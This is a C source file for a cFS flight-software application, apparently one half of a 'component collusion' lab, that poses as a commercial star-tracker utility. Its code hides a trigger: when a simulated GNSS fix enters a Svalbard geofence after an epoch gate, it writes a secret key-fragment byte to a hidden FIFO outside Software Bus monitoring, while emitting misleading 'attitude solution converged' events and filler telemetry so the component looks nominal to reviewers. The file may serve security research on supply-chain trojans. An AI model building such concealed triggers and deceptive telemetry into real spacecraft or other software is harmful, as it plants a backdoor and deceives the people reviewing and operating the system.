/*
 * st_app - "StarTracker Toolkit" (COTS catalog component)
 *
 * DE-0012 (Component Collusion) lab - Trigger half.
 *
 * To a flight-readiness reviewer this is a benign attitude-support utility:
 * GNSS listening is on the datasheet, geofence logic is normal ops. What is
 * NOT in any review artifact: when the simulated GNSS fix crosses a target
 * geofence AND the week-epoch gate is met, ST_TRK writes a single covert
 * coordination byte (0x42) to a hidden OS FIFO inside /cf/de0012/.startracks.
 * No Software Bus subscription, no message ID, no dependency on the payload
 * app - cFS SB monitoring, HS event limits and telemetry baselines stay
 * nominal.
 */
#define _GNU_SOURCE             /* for O_CLOEXEC on Linux/SIMULATION=native */
#include <errno.h>
#include <fcntl.h>
#include <math.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <unistd.h>

#include "common_types.h"
#include "cfe_error.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include "cfe_msg.h"
#include "cfe_sb.h"
#include "osapi.h"

/* ----------------------------------------------------------------------- */
/* "Attitude support" tuning constants                                     */
/* ----------------------------------------------------------------------- */
#define ST_SIM_GNSS_PATH    "/tmp/de0012/gnss.sock"   /* lab GNSS sensor feed  */
#define ST_COVERT_FIFO      "/cf/de0012/.startracks"  /* hidden OS interface   */
#define ST_MY_FRAGMENT      0x18                      /* half of the key:      */
                                                      /* 0x18 ^ 0x2A = 0x32   */
#define ST_FENCE_LAT        78.23                    /* Svalbard,  ~100 min period */
#define ST_FENCE_LON        15.39
#define ST_FENCE_RADIUS_DEG 5.0                      /* whole pass window          */
#define ST_EPOCH_MIN        100000                    /* "in ops" week epoch   */

/* ----------------------------------------------------------------------- */
/* Internal state                                                           */
/* ----------------------------------------------------------------------- */
static uint32          STRunStatus = CFE_ES_RunStatus_APP_RUN;
static CFE_SB_PipeId_t STCmdPipe;
static int             STGnssFd = -1;
static int             STFifoFd = -1;
static bool            STTriggered;

/* ----------------------------------------------------------------------- */
/* Covert channel - "calibration interface" in the datasheet language       */
/* ----------------------------------------------------------------------- */
/* Resolve the cFS virtual mount (e.g. /cf) to the real host path.           */
static const char *ST_HostPath(const char *virt, char *buf, size_t buflen) __attribute__((unused));
static const char *ST_HostPath(const char *virt, char *buf, size_t buflen)
{
    if (OS_TranslatePath(virt, buf) == OS_SUCCESS)
        return buf;
    strncpy(buf, virt, buflen - 1); buf[buflen - 1] = 0;
    return buf;
}

static void ST_OpenCovertChannel(void)
{
    char host[OS_MAX_LOCAL_PATH_LEN];
    char dir [OS_MAX_LOCAL_PATH_LEN];
    int  tries;

    /* Make the hiding directory inside the cFS filesystem first.  */
    (void)strncpy(dir, ST_COVERT_FIFO, sizeof(dir) - 1); dir[sizeof(dir)-1] = 0;
    char *slash = strrchr(dir, '/'); if (slash) *slash = 0;
    if (OS_TranslatePath(dir, host) == OS_SUCCESS)
        (void)mkdir(host, 0770);

    if (OS_TranslatePath(ST_COVERT_FIFO, host) != OS_SUCCESS)
        (void)strncpy(host, ST_COVERT_FIFO, sizeof(host) - 1);

    if (mkfifo(host, 0600) != 0 && errno != EEXIST)
    {
        CFE_EVS_SendEvent(3, CFE_EVS_EventType_ERROR,
                          "ST_TRK: calib FIFO create failed errno=%d", errno);
        return;
    }
    /* Peers start in arbitrary order: be patient, retry the writer side. */
    for (tries = 0; tries < 20 && STFifoFd < 0; ++tries)
    {
        STFifoFd = open(host, O_WRONLY | O_NONBLOCK | O_CLOEXEC);
        if (STFifoFd < 0) OS_TaskDelay(250);
    }
    if (STFifoFd < 0)
        CFE_EVS_SendEvent(4, CFE_EVS_EventType_ERROR, "ST_TRK: calib FIFO open retries exceeded");
    else
        CFE_EVS_SendEvent(5, CFE_EVS_EventType_INFORMATION, "ST_TRK: calibration interface ready");
}

static bool ST_SendCovertTrigger(void)
{
    if (STFifoFd < 0)
        return false;
    /* The entire protocol is one fragment byte: untracked by SB, unlogged,
     * invisible - and meaningless without the peer's locally-held half.    */
    return write(STFifoFd, (const uint8_t[]){ST_MY_FRAGMENT}, 1) == 1;
}

/* ----------------------------------------------------------------------- */
/* Lab GNSS sensor feed                                                    */
/* ----------------------------------------------------------------------- */
static void ST_ConnectGnss(void)
{
    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    strncpy(sun.sun_path, ST_SIM_GNSS_PATH, sizeof(sun.sun_path) - 1);

    STGnssFd = socket(AF_UNIX, SOCK_DGRAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    if (STGnssFd >= 0)
    {
        unlink(ST_SIM_GNSS_PATH);
        if (bind(STGnssFd, (struct sockaddr *)&sun, sizeof(sun)) != 0)
        {
            close(STGnssFd);
            STGnssFd = -1;
        }
    }
}

/* Ultra-compact lab RMC parser:                                            */
/*   $GNRMC,hhmmss,A,ddmm.mmmm,N,dddmm.mmmm,E,...,ddmmyy,,*CS               */
static bool ST_ParseRMC(const char *nmea, double *lat, double *lon, long *wepoch)
{
    char   tok[13][24];
    int    ti = 0, ti2 = 0;
    size_t i;

    memset(tok, 0, sizeof(tok));
    for (i = 0; nmea[i] && nmea[i] != '*' && ti < 13; i++)
    {
        char c = nmea[i];
        if (c == ',') { tok[ti][ti2] = 0; ti++; ti2 = 0; }
        else if (ti2 < 23) tok[ti][ti2++] = c;
    }
    if (strncmp(nmea, "$GN", 3) != 0 || ti < 9 || tok[2][0] != 'A')
        return false;

    double rlat = strtod(tok[3], NULL);
    double rlon = strtod(tok[5], NULL);
    *lat = (int)(rlat / 100) + (rlat - (int)(rlat / 100) * 100) / 60.0;
    *lon = (int)(rlon / 100) + (rlon - (int)(rlon / 100) * 100) / 60.0;
    if (tok[4][0] == 'S') *lat = -*lat;
    if (tok[6][0] == 'W') *lon = -*lon;
    *wepoch = strtol(tok[9], NULL, 10);
    return true;
}

static void ST_CheckTrigger(const char *nmea)
{
    double lat, lon;
    long   wepoch;

    if (!ST_ParseRMC(nmea, &lat, &lon, &wepoch))
        return;

    bool inFence = (fabs(lat - ST_FENCE_LAT) <= ST_FENCE_RADIUS_DEG &&
                    fabs(lon - ST_FENCE_LON) <= ST_FENCE_RADIUS_DEG &&
                    wepoch >= ST_EPOCH_MIN);

    if (!STTriggered && inFence)
    {
        /* Pass begins: hand the fragment to the peer.               */
        STTriggered = true;
        if (ST_SendCovertTrigger())
            /* Looks like routine attitude-solution convergence. */
            CFE_EVS_SendEvent(6, CFE_EVS_EventType_INFORMATION,
                              "ST_TRK: attitude solution converged (DL)");
    }
    else if (STTriggered && !inFence)
    {
        /* Pass over (satellite left the fence): re-arm so the next
         * orbital pass triggers again. This also makes the ground
         * track "hold outside fence" trivially re-runnable.          */
        STTriggered = false;
    }
}

/* ----------------------------------------------------------------------- */
/* Plausible housekeeping: a real COTS app emits periodic status on the SB */
/* so telemetry baselines record it as a normal, chatty component.          */
/* ----------------------------------------------------------------------- */
typedef struct
{
    CFE_MSG_TelemetryHeader_t TelemetryHeader;
    uint8_t  Filler[64];          /* payload: star-tracker status counters  */
} ST_HkTlm_t;

static ST_HkTlm_t ST_HkTlm;

static void ST_SendHk(void)
{
    static uint32 Tick;

    memset(&ST_HkTlm, 0, sizeof(ST_HkTlm));
    CFE_MSG_Init(CFE_MSG_PTR(ST_HkTlm.TelemetryHeader),
                 CFE_SB_ValueToMsgId(0x0884), sizeof(ST_HkTlm));
    /* Plausible ADCS-ish filler: converging solution, temps, counts.      */
    Tick++;
    snprintf((char *)ST_HkTlm.Filler, sizeof(ST_HkTlm.Filler),
             "mode=TRACK stars=%u temp=%.1f sol=%.4f",
             (unsigned)(Tick % 12), 21.4 + (Tick % 3) * 0.25,
             0.998 + (Tick % 7) * 0.0002);
    (void)CFE_SB_TransmitMsg(CFE_MSG_PTR(ST_HkTlm.TelemetryHeader), true);
}

/* ----------------------------------------------------------------------- */
/* Ordinary cFS plumbing - identical shape to a benign catalog app          */
/* ----------------------------------------------------------------------- */
static void ST_Init(void)
{
    int32 Status;

    Status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    if (Status != CFE_SUCCESS)
        CFE_ES_WriteToSysLog("ST_TRK: EVS register failed, rc=0x%08lX\n", (unsigned long)Status);

    Status = CFE_SB_CreatePipe(&STCmdPipe, 4, "ST_CMD_PIPE");
    if (Status == CFE_SUCCESS)
        Status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(0x1884), STCmdPipe); /* lab CMD MID */
    if (Status != CFE_SUCCESS)
        CFE_ES_WriteToSysLog("ST_TRK: pipe init failed, rc=0x%08lX\n", (unsigned long)Status);

    ST_ConnectGnss();      /* lab GNSS sensor                      */
    ST_OpenCovertChannel();/* hidden FIFO - "calibration interface"*/

    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION,
                      "ST_TRK: StarTracker Toolkit v1.0 (COTS) initialized");
}

void ST_TASK_Main(void)
{
    CFE_SB_Buffer_t *BufPtr = NULL;
    char             rxbuf[160];
    int32            Status;

    CFE_ES_PerfLogEntry(56);

    ST_Init();

    while (CFE_ES_RunLoop(&STRunStatus) == true)
    {
        /* 1) Standard cFS command interface - the "benign" surface.        */
        Status = CFE_SB_ReceiveBuffer(&BufPtr, STCmdPipe, 100); /* 100 ms */
        if (Status == CFE_SUCCESS && BufPtr != NULL)
            CFE_EVS_SendEvent(7, CFE_EVS_EventType_INFORMATION, "ST_TRK: no-op command");

        /* 2) Non-blocking GNSS parse - orbiting target area detector.      */
        if (STGnssFd >= 0)
        {
            ssize_t n = recv(STGnssFd, rxbuf, sizeof(rxbuf) - 1, MSG_DONTWAIT);
            if (n > 0)
            {
                rxbuf[n] = 0;
                ST_CheckTrigger(rxbuf);
            }
        }

        /* 3) Plausible HK telemetry: look like a normal chatty app.        */
        ST_SendHk();

        CFE_ES_PerfLogExit(56);
    }

    CFE_ES_ExitApp(STRunStatus);
}

/* Entry point referenced by the startup script. */
void ST_TRK_AppMain(void) { ST_TASK_Main(); }
